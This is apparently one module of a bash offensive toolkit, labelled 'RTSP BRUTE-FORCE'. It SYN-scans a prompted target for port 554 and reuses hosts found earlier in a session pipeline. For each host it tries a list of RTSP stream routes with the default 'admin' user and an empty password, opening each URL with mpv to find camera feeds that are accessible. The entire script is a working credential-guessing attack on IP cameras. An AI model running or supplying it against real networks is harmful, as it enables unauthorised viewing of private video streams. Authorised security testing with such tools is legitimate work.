#!/usr/bin/env bash
source "$(dirname "$0")/../lib.sh"
require_tool nmap
require_tool mpv

banner "RTSP BRUTE-FORCE" "RTSP stream discovery via nmap + mpv"

ip=$(prompt_target)
outdir=$(make_outdir)
logfile="$outdir/rtsp_results.txt"
printf '  %s[SYS]%s Target  : %s%s%s\n' "${CYAN}" "${RESET}" "${GREEN}" "$ip" "${RESET}"
printf '  %s[SYS]%s Output  : %s%s%s\n\n' "${CYAN}" "${RESET}" "${DIM}" "$logfile" "${RESET}"

# Pipeline: check chain_ports.txt for known :554 hosts to avoid full nmap rescan
_chain_554=""
if [[ -n "${SESSION_DIR:-}" ]] && [[ -s "${SESSION_DIR}/chain_ports.txt" ]]; then
  _chain_554=$(grep ':554$' "${SESSION_DIR}/chain_ports.txt" 2>/dev/null \
    | cut -d: -f1 | sort -u | tr '\n' ' ' | xargs 2>/dev/null || true)
fi

if [[ -n "$_chain_554" ]]; then
  printf '  %s[CHAIN]%s Port 554 hosts from chain_ports.txt: %s%s\n\n' \
    "${CYAN}" "${RESET}" "$_chain_554" "${RESET}"
  result="$_chain_554"
else
  result=$(nmap -sS -Pn -n -p 554 --open -T4 --max-retries 2 --max-scan-delay 10ms "$ip" \
    | grep -oE "([0-9]{1,3}[.]){3}[0-9]{1,3}")
fi
printf '%s\n' "$result"

for target_ip in $result; do
    while IFS= read -r line; do
        rtsp_url="rtsp://admin:@${target_ip}:554${line}"
        printf '\n  %s▶ TESTING:%s %s\n' "${CYAN}${BOLD}" "${RESET}" "$rtsp_url"
        printf '  %s──────────────────────────────────────────────%s\n' "${DIM}" "${RESET}"
        echo "$rtsp_url" | tee -a "$logfile"
        mpv "$rtsp_url" --no-audio --no-video
    done < "$(dirname "$0")/../routes.txt"
done

printf '\n  %s[SYS]%s IPs found: %s%s%s\n' "${CYAN}" "${RESET}" "${GREEN}" "${result:-none}" "${RESET}"
echo "IPs found: ${result}" | tee -a "$logfile" >/dev/null

# Pipeline chain: publish RTSP hosts → alive_hosts.txt + chain_ports.txt
if [[ -n "${SESSION_DIR:-}" ]] && [[ -n "${result:-}" ]]; then
  for _rip in $result; do
    printf '%s\n' "$_rip" >> "${SESSION_DIR}/alive_hosts.txt" 2>/dev/null || true
    printf '%s:554\n' "$_rip" >> "${SESSION_DIR}/chain_ports.txt" 2>/dev/null || true
  done
  sort -u "${SESSION_DIR}/alive_hosts.txt" -o "${SESSION_DIR}/alive_hosts.txt" 2>/dev/null || true
  sort -u "${SESSION_DIR}/chain_ports.txt" -o "${SESSION_DIR}/chain_ports.txt" 2>/dev/null || true
  printf '  %s[CHAIN]%s RTSP hosts → alive_hosts.txt + chain_ports.txt%s\n\n' \
    "${CYAN}" "${RESET}" "${RESET}"
fi
mark_done "$outdir"
